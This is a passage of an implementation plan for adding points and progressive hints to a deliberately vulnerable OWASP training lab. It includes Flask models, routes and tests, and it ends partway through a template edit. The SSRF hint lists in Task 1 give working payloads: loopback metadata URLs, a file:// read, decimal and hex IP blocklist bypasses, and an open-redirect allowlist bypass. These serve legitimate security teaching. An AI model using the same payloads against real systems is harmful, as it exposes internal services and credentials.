# Scoring + Hints System Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add an optional, global scoring system to the OWASP Top 10 Training
Lab — completing an exercise awards points by difficulty (30 Hard / 20
Medium / 10 Easy), reduced by however many progressive hints were revealed
first, with a settings toggle that also hides the existing exploit
instructions while scoring is on.

**Architecture:** One framework task builds and tests the entire mechanism
(data model, points formula, two routes, shared-template UI, settings page,
nav bar, home page) against a small real pilot set (all 5 of A10's
examples). Every subsequent task authors real, escalating hint content for
one remaining category's examples and wires it into that category's
`ExampleNav` declarations — no further mechanism code changes, just content
plus a shape-validation test per category. A03 (19 examples) is split into
two content tasks; every other category is one task.

**Tech Stack:** Flask 3.0.3, SQLAlchemy, Jinja2, pytest.

**Spec:** `docs/superpowers/specs/2026-09-23-owasp-lab-scoring-hints-design.md`

## Global Constraints

- Scoring is off by default (`Settings.scoring_enabled` default `False`).
- Points: `points = floor(base_points × (hint_count − hints_used + 1) / (hint_count + 1))`,
  `base_points` = 10/20/30 for Easy/Medium/Hard, using integer floor
  division (`//` in Python). `hints_used` is clamped to `[0, hint_count]`.
- Points are computed once and frozen (`ExampleProgress.points_awarded`)
  at the moment "Mark as done" transitions an example from not-completed to
  completed. Revealing more hints afterward never changes an already-earned
  score. Un-marking clears `points_awarded` to `None` (frozen score no
  longer counts) but never resets `hints_used` — a later re-completion
  recomputes from whatever `hints_used` is at that time.
- `ExampleProgress` rows are no longer deleted when "Mark as done" is
  toggled off — `completed_at` becomes nullable and is set to `None`
  instead, so `hints_used` survives an unmark/re-mark cycle. This is a
  real behavior change from today's delete-the-row semantics.
- While `scoring_enabled` is True, the EFFECTIVE value of "show exploit
  instructions" is always False, everywhere it's checked in templates —
  computed as `settings.show_exploit_instructions and not
  settings.scoring_enabled`, never by mutating the stored
  `show_exploit_instructions` value. The Settings page's own POST handler
  must NOT overwrite the stored `show_exploit_instructions` value when the
  incoming `scoring_enabled` is True (avoids a disabled/unsubmitted
  checkbox silently flipping the stored preference to False).
- Hint content lives as static Python data on `ExampleNav.hints` (a
  `list[str]`), authored per example, NEVER in the database — matching
  this app's existing convention that only mutable state lives in the DB.
- Hint-authoring rubric (applied in every content task): 3-5 hints per
  example, vague-to-explicit. Hint 1 names the general technique category
  or points at WHERE to look, without the specific payload. Middle hint(s)
  narrow toward the specific vulnerable parameter/mechanism. The final
  hint gives a working payload or the exact steps to reproduce that
  example's own Exploitation section.
- No formal DB migrations exist in this app (`db.create_all()`/`drop_all()`
  only). This plan's schema changes add columns to two already-existing
  tables (`settings`, `example_progress`) — the first time this has
  happened in this app's history. No code handles this; it's a deployment
  note (any already-provisioned deployment needs "Reset Lab" or
  `docker compose down -v && up` after upgrading), not a blocking concern
  for any task below, since every task's own tests run against a fresh
  test database via the existing `TestConfig`/`seed_database` fixtures.
- `tests/conftest.py` is off-limits — never modify it, for any reason, in
  any task.

---

## Task 1: Framework — Data Model, Routes, Shared UI, Settings, A10 Pilot Hints

**Files:**
- Modify: `app/core/models.py`
- Modify: `app/core/nav.py`
- Modify: `app/core/views.py`
- Modify: `app/core/__init__.py`
- Modify: `app/core/templates/core/example_page_base.html`
- Modify: `app/core/templates/core/settings.html`
- Modify: `app/core/templates/core/base.html`
- Modify: `app/core/templates/core/home.html`
- Modify: `app/categories/a10_ssrf/__init__.py`
- Modify: `tests/test_progress.py`
- Create: `tests/test_scoring.py`
- Create: `tests/test_hints.py`

**Interfaces:**
- Consumes: nothing from earlier tasks (this is the first task).
- Produces (every later task depends on these exact names):
  - `app.core.nav.ExampleNav.hints: list[str]` field (default `[]`) and
    `ExampleNav.base_points() -> int` method.
  - `app.core.models.compute_points(example, hints_used) -> int` pure
    function.
  - `app.core.models.ExampleProgress` gains `hints_used: int` (default 0)
    and `points_awarded: int | None`; `completed_at` becomes nullable.
  - `app.core.models.Settings.scoring_enabled: bool` (default `False`).
  - Route `POST /hints/reveal` (endpoint `core.reveal_hint`), form field
    `example_id`.
  - `POST /progress/toggle` now freezes/clears `points_awarded` instead of
    deleting the row.
  - Template globals injected by the context processor:
    `current_progress` (an `ExampleProgress`-shaped object with
    `hints_used`/`completed_at`/`points_awarded`), `current_example_pending_points`,
    `nav_score_earned`, `nav_score_max`. `completed_example_ids` now only
    contains examples with `completed_at is not None`.

- [ ] **Step 1: Write the failing scoring-formula tests**

Create `tests/test_scoring.py`:

```python
from app.core.models import compute_points
from app.core.nav import ExampleNav


def _example(difficulty, hint_count):
    return ExampleNav(
        id="test-example",
        title="Test",
        group="Test Group",
        difficulty=difficulty,
        endpoint="core.home",
        hints=[f"hint {i}" for i in range(hint_count)],
    )


def test_compute_points_hard_with_four_hints_matches_confirmed_formula():
    example = _example("Hard", 4)
    assert compute_points(example, 0) == 30
    assert compute_points(example, 1) == 24
    assert compute_points(example, 2) == 18
    assert compute_points(example, 3) == 12
    assert compute_points(example, 4) == 6


def test_compute_points_easy_with_three_hints_matches_confirmed_formula():
    example = _example("Easy", 3)
    assert compute_points(example, 0) == 10
    assert compute_points(example, 1) == 7
    assert compute_points(example, 2) == 5
    assert compute_points(example, 3) == 2


def test_compute_points_clamps_hints_used_above_hint_count():
    example = _example("Medium", 3)
    assert compute_points(example, 99) == compute_points(example, 3)


def test_compute_points_defensive_zero_hint_count_returns_full_base_points():
    example = _example("Hard", 0)
    assert compute_points(example, 0) == 30
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_scoring.py -v`
Expected: FAIL — `ImportError: cannot import name 'compute_points'` (and
`ExampleNav(...)` will also fail since it doesn't accept `hints=` yet).

- [ ] **Step 3: Extend `ExampleNav` in `app/core/nav.py`**

Current file:

```python
from dataclasses import dataclass, field


@dataclass
class ExampleNav:
    id: str
    title: str
    group: str
    difficulty: str
    endpoint: str

    def difficulty_badge_class(self) -> str:
        return {
            "Easy": "text-bg-success",
            "Medium": "text-bg-warning",
            "Hard": "text-bg-danger",
        }[self.difficulty]


@dataclass
class CategoryNav:
    id: str
    short_id: str
    title: str
    blueprint_name: str
    overview_endpoint: str
    examples: list = field(default_factory=list)
    seed_fn: object = None
    blurb: str = ""

    def grouped_examples(self):
        groups = {}
        order = []
        for example in self.examples:
            if example.group not in groups:
                groups[example.group] = []
                order.append(example.group)
            groups[example.group].append(example)
        return [(name, groups[name]) for name in order]


CATEGORIES: list = []
```

Replace the `ExampleNav` class with:

```python
@dataclass
class ExampleNav:
    id: str
    title: str
    group: str
    difficulty: str
    endpoint: str
    hints: list = field(default_factory=list)

    def difficulty_badge_class(self) -> str:
        return {
            "Easy": "text-bg-success",
            "Medium": "text-bg-warning",
            "Hard": "text-bg-danger",
        }[self.difficulty]

    def base_points(self) -> int:
        return {"Easy": 10, "Medium": 20, "Hard": 30}[self.difficulty]
```

(`CategoryNav` and `CATEGORIES` are unchanged — leave them exactly as-is.)

- [ ] **Step 4: Extend `app/core/models.py`**

Current file:

```python
from datetime import datetime

from app.extensions import db


class Settings(db.Model):
    __tablename__ = "settings"

    id = db.Column(db.Integer, primary_key=True)
    show_explanations = db.Column(db.Boolean, nullable=False, default=True)
    show_exploit_instructions = db.Column(db.Boolean, nullable=False, default=False)

    @classmethod
    def get(cls):
        settings = cls.query.first()
        if settings is None:
            settings = cls(show_explanations=True, show_exploit_instructions=False)
            db.session.add(settings)
            db.session.commit()
        return settings


class User(db.Model):
    __tablename__ = "users"

    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    display_name = db.Column(db.String(120), nullable=False)
    bio = db.Column(db.Text, nullable=False, default="")
    private_notes = db.Column(db.Text, nullable=False, default="")
    role = db.Column(db.String(20), nullable=False, default="user")


class ExampleProgress(db.Model):
    __tablename__ = "example_progress"

    id = db.Column(db.Integer, primary_key=True)
    example_id = db.Column(db.String(80), unique=True, nullable=False)
    completed_at = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
```

Replace it in full with:

```python
from datetime import datetime

from app.extensions import db


class Settings(db.Model):
    __tablename__ = "settings"

    id = db.Column(db.Integer, primary_key=True)
    show_explanations = db.Column(db.Boolean, nullable=False, default=True)
    show_exploit_instructions = db.Column(db.Boolean, nullable=False, default=False)
    scoring_enabled = db.Column(db.Boolean, nullable=False, default=False)

    @classmethod
    def get(cls):
        settings = cls.query.first()
        if settings is None:
            settings = cls(
                show_explanations=True,
                show_exploit_instructions=False,
                scoring_enabled=False,
            )
            db.session.add(settings)
            db.session.commit()
        return settings


class User(db.Model):
    __tablename__ = "users"

    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    display_name = db.Column(db.String(120), nullable=False)
    bio = db.Column(db.Text, nullable=False, default="")
    private_notes = db.Column(db.Text, nullable=False, default="")
    role = db.Column(db.String(20), nullable=False, default="user")


class ExampleProgress(db.Model):
    __tablename__ = "example_progress"

    id = db.Column(db.Integer, primary_key=True)
    example_id = db.Column(db.String(80), unique=True, nullable=False)
    completed_at = db.Column(db.DateTime, nullable=True)
    hints_used = db.Column(db.Integer, nullable=False, default=0)
    points_awarded = db.Column(db.Integer, nullable=True)


def compute_points(example, hints_used):
    """Points earned for completing `example` after using `hints_used` hints.

    Base points come from difficulty (30 Hard / 20 Medium / 10 Easy). Each
    hint forfeits one even share of an (hint_count + 1)-share pool, so
    finishing always earns at least one share.
    """
    hint_count = len(example.hints)
    if hint_count == 0:
        return example.base_points()
    shares = hint_count + 1
    used = min(hints_used, hint_count)
    return (example.base_points() * (shares - used)) // shares
```

- [ ] **Step 5: Run scoring tests to verify they pass**

Run: `.venv/bin/pytest tests/test_scoring.py -v`
Expected: PASS (4 passed)

- [ ] **Step 6: Commit**

```bash
git add app/core/nav.py app/core/models.py tests/test_scoring.py
git commit -m "feat(scoring): add compute_points formula, ExampleNav.hints, ExampleProgress score fields

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

- [ ] **Step 7: Add A10's 5 real hint sequences**

Modify `app/categories/a10_ssrf/__init__.py`. Current file:

```python
from flask import Blueprint

a10_bp = Blueprint(
    "a10_ssrf", __name__, template_folder="templates", url_prefix="/a10"
)

from app.categories.a10_ssrf import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a10_ssrf",
        short_id="A10",
        title="Server-Side Request Forgery",
        blurb="A URL field the server fetches on your behalf, an unrestricted scheme, or a blocklist/allowlist with a gap wide enough to reach an internal-only endpoint that should never have been visible from outside.",
        blueprint_name="a10_ssrf",
        overview_endpoint="a10_ssrf.overview",
        examples=[
            ExampleNav(
                id="webhook-internal-metadata",
                title="Webhook Tester Reaches Internal Metadata Endpoint",
                group="Unrestricted Server-Side Fetch",
                difficulty="Easy",
                endpoint="a10_ssrf.webhook_tester",
            ),
            ExampleNav(
                id="fetch-based-port-scan",
                title="Same Fetcher Enables Internal Port Scanning",
                group="Unrestricted Server-Side Fetch",
                difficulty="Medium",
                endpoint="a10_ssrf.port_scan_demo",
            ),
            ExampleNav(
                id="file-scheme-local-read",
                title="PDF Generator Reads Local Files via file:// URL",
                group="Unsafe URL Scheme Handling",
                difficulty="Easy",
                endpoint="a10_ssrf.pdf_generator",
            ),
            ExampleNav(
                id="blocklist-alternate-ip-bypass",
                title="Alternate IP Representation Bypasses a Naive Blocklist",
                group="Blocklist Bypass Techniques",
                difficulty="Medium",
                endpoint="a10_ssrf.import_avatar",
            ),
            ExampleNav(
                id="blocklist-redirect-bypass",
                title="Open Redirect Bypasses a Trusted-Domain Allowlist",
                group="Blocklist Bypass Techniques",
                difficulty="Hard",
                endpoint="a10_ssrf.mirror_fetcher",
            ),
        ],
    )
)
```

Replace each `ExampleNav(...)` call with the same fields plus a `hints=[...]`
argument, exactly as follows (only the added `hints=` lines are new; every
other field is unchanged):

```python
from flask import Blueprint

a10_bp = Blueprint(
    "a10_ssrf", __name__, template_folder="templates", url_prefix="/a10"
)

from app.categories.a10_ssrf import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a10_ssrf",
        short_id="A10",
        title="Server-Side Request Forgery",
        blurb="A URL field the server fetches on your behalf, an unrestricted scheme, or a blocklist/allowlist with a gap wide enough to reach an internal-only endpoint that should never have been visible from outside.",
        blueprint_name="a10_ssrf",
        overview_endpoint="a10_ssrf.overview",
        examples=[
            ExampleNav(
                id="webhook-internal-metadata",
                title="Webhook Tester Reaches Internal Metadata Endpoint",
                group="Unrestricted Server-Side Fetch",
                difficulty="Easy",
                endpoint="a10_ssrf.webhook_tester",
                hints=[
                    "This form fetches whatever URL you give it, server-side, with no restriction on the destination. Think about what other addresses the SERVER itself can reach that you, as an outside visitor, normally can't.",
                    "The server can always reach itself over its own loopback interface — and the internal metadata endpoint at /a10/internal/metadata only trusts requests that arrive from 127.0.0.1.",
                    "Submit http://127.0.0.1:5000/a10/internal/metadata as the webhook URL — the server fetches it on your behalf and shows you the response, including fake access-key/secret-key data an internal-only endpoint was never meant to expose.",
                ],
            ),
            ExampleNav(
                id="fetch-based-port-scan",
                title="Same Fetcher Enables Internal Port Scanning",
                group="Unrestricted Server-Side Fetch",
                difficulty="Medium",
                endpoint="a10_ssrf.port_scan_demo",
                hints=[
                    "This page teaches a different use of the SAME unrestricted fetch you already found in Webhook Tester. What can you learn about the internal network just from how a request to a DIFFERENT internal port behaves?",
                    "A port with something listening behaves differently (returns content) than a port with nothing listening (connection refused) — even without understanding the internal service's protocol at all.",
                    "In the Webhook Tester, submit http://127.0.0.1:5000/a10/internal/metadata (real service, responds) and then http://127.0.0.1:9999/ (nothing listening, immediate connection error) — comparing the two responses lets you map which internal ports are open, one request at a time.",
                ],
            ),
            ExampleNav(
                id="file-scheme-local-read",
                title="PDF Generator Reads Local Files via file:// URL",
                group="Unsafe URL Scheme Handling",
                difficulty="Easy",
                endpoint="a10_ssrf.pdf_generator",
                hints=[
                    "This 'PDF generator' fetches whatever URL you give it and renders the response. urllib's urlopen() supports more than just http:// and https:// — what other URL schemes might it accept?",
                    "Python's urllib supports the file:// scheme, which reads a local file directly off the server's own filesystem instead of making a network request at all.",
                    "Submit a file:// URL pointing at a file on the server (the page itself shows you the exact local path to try) as the 'page URL' — the server reads and returns that local file's contents instead of fetching a web page.",
                ],
            ),
            ExampleNav(
                id="blocklist-alternate-ip-bypass",
                title="Alternate IP Representation Bypasses a Naive Blocklist",
                group="Blocklist Bypass Techniques",
                difficulty="Medium",
                endpoint="a10_ssrf.import_avatar",
                hints=[
                    "This form blocks the literal strings '127.0.0.1' and 'localhost'. Is there more than one way to write the loopback address that doesn't contain either of those exact strings?",
                    "IP addresses can be written in several equivalent forms — decimal integer, hexadecimal, or a shortened dotted form — that all resolve to the exact same address but don't match a blocklist doing exact string comparison.",
                    "Try http://2130706433:5000/a10/internal/metadata (decimal form of 127.0.0.1) or http://0x7f000001:5000/a10/internal/metadata (hex form) or http://127.1:5000/a10/internal/metadata (short form) as the avatar URL — none of these contain the strings '127.0.0.1' or 'localhost', so the blocklist never blocks them, but they all resolve to the same loopback address.",
                ],
            ),
            ExampleNav(
                id="blocklist-redirect-bypass",
                title="Open Redirect Bypasses a Trusted-Domain Allowlist",
                group="Blocklist Bypass Techniques",
                difficulty="Hard",
                endpoint="a10_ssrf.mirror_fetcher",
                hints=[
                    "This form only allows fetching from trusted-mirror.example — checked once, before the request is made. What happens if the URL you submit is allowed, but it doesn't serve the final content itself?",
                    "urlopen() follows HTTP redirects automatically by default, and this code never re-checks the Location header's destination against the allowlist — only the URL you originally submitted gets checked.",
                    "You need a domain that resolves to trusted-mirror.example (e.g. by editing your own /etc/hosts to point trusted-mirror.example at a server you control) and a server at that address that responds with an HTTP redirect (a 3xx status plus a Location header) pointing at the real internal target.",
                    "Point /etc/hosts's trusted-mirror.example entry at 127.0.0.1, run a small local HTTP server that responds to any request with a 302 redirect to http://127.0.0.1:5000/a10/internal/metadata, then submit http://trusted-mirror.example:8080/ (or wherever your redirect server listens) as the mirror URL — the allowlist check passes on the original hostname, but the fetch itself follows the redirect straight to the internal endpoint.",
                ],
            ),
        ],
    )
)
```

- [ ] **Step 8: Modify `app/core/views.py`**

Current file:

```python
from flask import Blueprint, Response, abort, current_app, flash, redirect, render_template, request, session, url_for

from app.core.models import ExampleProgress, Settings, User
from app.core.nav import CATEGORIES
from app.core.seed import reset_database
from app.extensions import db

core_bp = Blueprint("core", __name__, template_folder="templates")


def _is_safe_redirect_target(target):
    return bool(target) and target.startswith("/") and not target.startswith("//")


@core_bp.route("/")
def home():
    completed_ids = {p.example_id for p in ExampleProgress.query.all()}
    category_stats = []
    for category in sorted(CATEGORIES, key=lambda c: c.short_id):
        completed = sum(1 for e in category.examples if e.id in completed_ids)
        category_total = len(category.examples)
        category_stats.append(
            {
                "category": category,
                "completed": completed,
                "total": category_total,
                "percent": round(completed / category_total * 100) if category_total else 0,
            }
        )
    completed_total = sum(cs["completed"] for cs in category_stats)
    total = sum(cs["total"] for cs in category_stats)
    overall_percent = round(completed_total / total * 100) if total else 0
    return render_template(
        "core/home.html",
        completed_total=completed_total,
        total=total,
        overall_percent=overall_percent,
        category_stats=category_stats,
    )


@core_bp.route("/switch-user", methods=["GET", "POST"])
def switch_user():
    if request.method == "POST":
        session["user_id"] = int(request.form["user_id"])
        next_url = request.args.get("next")
        if _is_safe_redirect_target(next_url):
            return redirect(next_url)
        return redirect(url_for("core.home"))
    users = User.query.order_by(User.username).all()
    return render_template("core/switch_user.html", users=users)


@core_bp.route("/logout", methods=["POST"])
def logout():
    session.pop("user_id", None)
    return redirect(url_for("core.home"))


@core_bp.route("/settings", methods=["GET", "POST"])
def settings_page():
    settings = Settings.get()
    if request.method == "POST":
        settings.show_explanations = "show_explanations" in request.form
        settings.show_exploit_instructions = "show_exploit_instructions" in request.form
        db.session.commit()
        flash("Settings updated.")
        return redirect(url_for("core.settings_page"))
    return render_template("core/settings.html", settings=settings)


@core_bp.route("/settings/reset", methods=["POST"])
def reset_lab():
    reset_database(current_app)
    flash("Lab reset to clean state.")
    return redirect(url_for("core.settings_page"))


@core_bp.route("/force-reset")
def force_reset():
    """Safety-net reset reachable by URL alone.

    Deliberately GET, self-contained (no template inheritance), and requires
    no working nav/context processor -- if the app itself is broken and the
    normal Settings page can't be reached, this route still resets the DB
    and clears the session.
    """
    reset_database(current_app)
    session.clear()
    return Response(
        "<!doctype html><title>Lab reset</title>"
        "<p>The lab has been force-reset: the database was restored to its "
        "clean seeded state and your session was cleared.</p>"
        '<p><a href="/">Return to the lab</a></p>',
        mimetype="text/html",
    )


# No CSRF token: matches every other POST route in this app (settings_page,
# reset_lab, logout, switch_user) -- adding one only here would be
# inconsistent. Impact is low (this only flips a training checkbox) and
# the app is meant to run on 127.0.0.1 only.
@core_bp.route("/progress/toggle", methods=["POST"])
def toggle_progress():
    example_id = request.form.get("example_id", "")
    example = next(
        (
            e
            for c in CATEGORIES
            for e in c.examples
            if e.id == example_id and e.endpoint in current_app.view_functions
        ),
        None,
    )
    if example is None:
        abort(404)
    existing = ExampleProgress.query.filter_by(example_id=example_id).first()
    if existing:
        db.session.delete(existing)
    else:
        db.session.add(ExampleProgress(example_id=example_id))
    db.session.commit()
    return redirect(url_for(example.endpoint))


@core_bp.route("/tools")
def tools_page():
    return render_template("core/tools.html")


@core_bp.route("/about")
def about_page():
    return render_template("core/about.html")
```

Replace it in full with:

```python
from datetime import datetime

from flask import Blueprint, Response, abort, current_app, flash, redirect, render_template, request, session, url_for

from app.core.models import ExampleProgress, Settings, User, compute_points
from app.core.nav import CATEGORIES
from app.core.seed import reset_database
from app.extensions import db

core_bp = Blueprint("core", __name__, template_folder="templates")


def _is_safe_redirect_target(target):
    return bool(target) and target.startswith("/") and not target.startswith("//")


def _find_example(example_id):
    return next(
        (
            e
            for c in CATEGORIES
            for e in c.examples
            if e.id == example_id and e.endpoint in current_app.view_functions
        ),
        None,
    )


@core_bp.route("/")
def home():
    progress_rows = {p.example_id: p for p in ExampleProgress.query.all()}
    completed_ids = {
        example_id for example_id, p in progress_rows.items() if p.completed_at is not None
    }
    category_stats = []
    for category in sorted(CATEGORIES, key=lambda c: c.short_id):
        completed = sum(1 for e in category.examples if e.id in completed_ids)
        category_total = len(category.examples)
        earned_points = sum(
            progress_rows[e.id].points_awarded or 0
            for e in category.examples
            if e.id in completed_ids
        )
        max_points = sum(e.base_points() for e in category.examples)
        category_stats.append(
            {
                "category": category,
                "completed": completed,
                "total": category_total,
                "percent": round(completed / category_total * 100) if category_total else 0,
                "earned_points": earned_points,
                "max_points": max_points,
            }
        )
    completed_total = sum(cs["completed"] for cs in category_stats)
    total = sum(cs["total"] for cs in category_stats)
    overall_percent = round(completed_total / total * 100) if total else 0
    earned_points_total = sum(cs["earned_points"] for cs in category_stats)
    max_points_total = sum(cs["max_points"] for cs in category_stats)
    return render_template(
        "core/home.html",
        completed_total=completed_total,
        total=total,
        overall_percent=overall_percent,
        category_stats=category_stats,
        earned_points_total=earned_points_total,
        max_points_total=max_points_total,
    )


@core_bp.route("/switch-user", methods=["GET", "POST"])
def switch_user():
    if request.method == "POST":
        session["user_id"] = int(request.form["user_id"])
        next_url = request.args.get("next")
        if _is_safe_redirect_target(next_url):
            return redirect(next_url)
        return redirect(url_for("core.home"))
    users = User.query.order_by(User.username).all()
    return render_template("core/switch_user.html", users=users)


@core_bp.route("/logout", methods=["POST"])
def logout():
    session.pop("user_id", None)
    return redirect(url_for("core.home"))


@core_bp.route("/settings", methods=["GET", "POST"])
def settings_page():
    settings = Settings.get()
    if request.method == "POST":
        settings.show_explanations = "show_explanations" in request.form
        new_scoring_enabled = "scoring_enabled" in request.form
        # While scoring is (or is about to be) enabled, exploit instructions
        # are always effectively hidden regardless of this checkbox's own
        # stored value (see example_page_base.html's derived-effective-value
        # check) -- so leave the stored value untouched rather than letting
        # a disabled, therefore-unsubmitted checkbox silently flip it to
        # False on save.
        if not new_scoring_enabled:
            settings.show_exploit_instructions = "show_exploit_instructions" in request.form
        settings.scoring_enabled = new_scoring_enabled
        db.session.commit()
        flash("Settings updated.")
        return redirect(url_for("core.settings_page"))
    return render_template("core/settings.html", settings=settings)


@core_bp.route("/settings/reset", methods=["POST"])
def reset_lab():
    reset_database(current_app)
    flash("Lab reset to clean state.")
    return redirect(url_for("core.settings_page"))


@core_bp.route("/force-reset")
def force_reset():
    """Safety-net reset reachable by URL alone.

    Deliberately GET, self-contained (no template inheritance), and requires
    no working nav/context processor -- if the app itself is broken and the
    normal Settings page can't be reached, this route still resets the DB
    and clears the session.
    """
    reset_database(current_app)
    session.clear()
    return Response(
        "<!doctype html><title>Lab reset</title>"
        "<p>The lab has been force-reset: the database was restored to its "
        "clean seeded state and your session was cleared.</p>"
        '<p><a href="/">Return to the lab</a></p>',
        mimetype="text/html",
    )


# No CSRF token: matches every other POST route in this app (settings_page,
# reset_lab, logout, switch_user) -- adding one only here would be
# inconsistent. Impact is low (this only flips a training checkbox) and
# the app is meant to run on 127.0.0.1 only.
@core_bp.route("/progress/toggle", methods=["POST"])
def toggle_progress():
    example_id = request.form.get("example_id", "")
    example = _find_example(example_id)
    if example is None:
        abort(404)
    progress = ExampleProgress.query.filter_by(example_id=example_id).first()
    if progress is None:
        progress = ExampleProgress(example_id=example_id)
        db.session.add(progress)
    if progress.completed_at is None:
        progress.completed_at = datetime.utcnow()
        progress.points_awarded = compute_points(example, progress.hints_used)
    else:
        progress.completed_at = None
        progress.points_awarded = None
    db.session.commit()
    return redirect(url_for(example.endpoint))


@core_bp.route("/hints/reveal", methods=["POST"])
def reveal_hint():
    example_id = request.form.get("example_id", "")
    example = _find_example(example_id)
    if example is None:
        abort(404)
    progress = ExampleProgress.query.filter_by(example_id=example_id).first()
    if progress is None:
        progress = ExampleProgress(example_id=example_id)
        db.session.add(progress)
    if progress.hints_used < len(example.hints):
        progress.hints_used += 1
    db.session.commit()
    return redirect(url_for(example.endpoint))


@core_bp.route("/tools")
def tools_page():
    return render_template("core/tools.html")


@core_bp.route("/about")
def about_page():
    return render_template("core/about.html")
```

(This refactors the duplicated example-lookup logic in `toggle_progress`
into a shared `_find_example` helper, reused by the new `reveal_hint`
route — the exact same lookup semantics as before, just not copy-pasted
twice.)

- [ ] **Step 9: Modify `app/core/__init__.py`'s context processor**

Current file:

```python
from flask import current_app, request


def register_core(app):
    from app.core.auth import get_current_user
    from app.core.models import ExampleProgress, Settings
    from app.core.nav import CATEGORIES
    from app.core.views import core_bp

    app.register_blueprint(core_bp)

    @app.context_processor
    def inject_globals():
        active_category = next(
            (
                c
                for c in CATEGORIES
                if request.endpoint and request.endpoint.startswith(c.blueprint_name + ".")
            ),
            None,
        )
        current_example = next(
            (e for c in CATEGORIES for e in c.examples if e.endpoint == request.endpoint),
            None,
        )
        completed_example_ids = {p.example_id for p in ExampleProgress.query.all()}
        return dict(
            settings=Settings.get(),
            categories=sorted(CATEGORIES, key=lambda c: c.short_id),
            current_user=get_current_user(),
            active_category=active_category,
            registered_endpoints=set(current_app.view_functions.keys()),
            current_example=current_example,
            completed_example_ids=completed_example_ids,
        )
```

Replace it in full with:

```python
from flask import current_app, request


def register_core(app):
    from app.core.auth import get_current_user
    from app.core.models import ExampleProgress, Settings, compute_points
    from app.core.nav import CATEGORIES
    from app.core.views import core_bp

    app.register_blueprint(core_bp)

    @app.context_processor
    def inject_globals():
        active_category = next(
            (
                c
                for c in CATEGORIES
                if request.endpoint and request.endpoint.startswith(c.blueprint_name + ".")
            ),
            None,
        )
        current_example = next(
            (e for c in CATEGORIES for e in c.examples if e.endpoint == request.endpoint),
            None,
        )
        progress_rows = {p.example_id: p for p in ExampleProgress.query.all()}
        completed_example_ids = {
            example_id
            for example_id, p in progress_rows.items()
            if p.completed_at is not None
        }
        if current_example is not None and current_example.id in progress_rows:
            current_progress = progress_rows[current_example.id]
        else:
            current_progress = ExampleProgress(hints_used=0, completed_at=None, points_awarded=None)
        current_example_pending_points = (
            compute_points(current_example, current_progress.hints_used)
            if current_example is not None
            else None
        )
        nav_score_earned = sum(
            p.points_awarded or 0 for p in progress_rows.values() if p.completed_at is not None
        )
        nav_score_max = sum(e.base_points() for c in CATEGORIES for e in c.examples)
        return dict(
            settings=Settings.get(),
            categories=sorted(CATEGORIES, key=lambda c: c.short_id),
            current_user=get_current_user(),
            active_category=active_category,
            registered_endpoints=set(current_app.view_functions.keys()),
            current_example=current_example,
            completed_example_ids=completed_example_ids,
            current_progress=current_progress,
            current_example_pending_points=current_example_pending_points,
            nav_score_earned=nav_score_earned,
            nav_score_max=nav_score_max,
        )
```

(The `ExampleProgress(hints_used=0, completed_at=None, points_awarded=None)`
fallback constructs a transient, never-committed instance — valid
SQLAlchemy usage since it's never `db.session.add()`-ed — giving templates
a single consistent type to read `.hints_used`/`.points_awarded`/
`.completed_at` from whether or not a real row exists yet.)

- [ ] **Step 10: Modify `app/core/templates/core/example_page_base.html`**

Current file:

```html
{% extends "core/base.html" %}

{% block content %}
{% set badge_classes = {"Easy": "text-bg-success", "Medium": "text-bg-warning", "Hard": "text-bg-danger"} %}
<div class="d-flex justify-content-between align-items-center mb-3">
  <h1>{{ example_title }}</h1>
  <div class="d-flex align-items-center gap-2">
    {% if current_example %}
    <form method="post" action="{{ url_for('core.toggle_progress') }}" class="d-inline">
      <input type="hidden" name="example_id" value="{{ current_example.id }}">
      {% if current_example.id in completed_example_ids %}
      <button type="submit" class="btn btn-success btn-sm">✓ Completed</button>
      {% else %}
      <button type="submit" class="btn btn-outline-secondary btn-sm">Mark as done</button>
      {% endif %}
    </form>
    {% endif %}
    <span class="badge {{ badge_classes[example_difficulty] }}">{{ example_difficulty }}</span>
  </div>
</div>

{% if settings.show_explanations %}
<section class="card mb-4">
  <div class="card-header">Explanation</div>
  <div class="card-body">
    {% block explanation %}{% endblock %}
  </div>
</section>
{% endif %}

{% if settings.show_exploit_instructions %}
{% set detect_content = self.detect() %}
{% if detect_content|trim %}
<section class="card mb-4">
  <div class="card-header">Detect</div>
  <div class="card-body">
    {% block detect %}{% endblock %}
  </div>
</section>
{% endif %}

<section class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white">Exploitation</div>
  <div class="card-body">
    {% block exploitation %}{% endblock %}
  </div>
</section>

{% set tasks_content = self.tasks() %}
{% if tasks_content|trim %}
<section class="card mb-4">
  <div class="card-header">Tasks</div>
  <div class="card-body">
    {% block tasks %}{% endblock %}
  </div>
</section>
{% endif %}
{% endif %}

{% set vulnerable_content = self.vulnerable_code() %}
{% set secure_content = self.secure_code() %}
{% if vulnerable_content|trim or secure_content|trim %}
<section class="card mb-4">
  <div class="card-header">Vulnerable vs. Secure</div>
  <div class="card-body">
    <div class="row">
      <div class="col-md-6">
        <h6>Vulnerable</h6>
        <pre><code class="language-{{ code_language|default('python') }}">{% block vulnerable_code %}{% endblock %}</code></pre>
      </div>
      <div class="col-md-6">
        <h6>Secure</h6>
        <pre><code class="language-{{ code_language|default('python') }}">{% block secure_code %}{% endblock %}</code></pre>
      </div>
    </div>
  </div>
</section>
{% endif %}

<section class="card">
  <div class="card-header">Try It</div>
  <div class="card-body">
    {% block live_example %}{% endblock %}
  </div>
</section>
{% endblock %}
```

Replace it in full with:

```html
{% extends "core/base.html" %}

{% block content %}
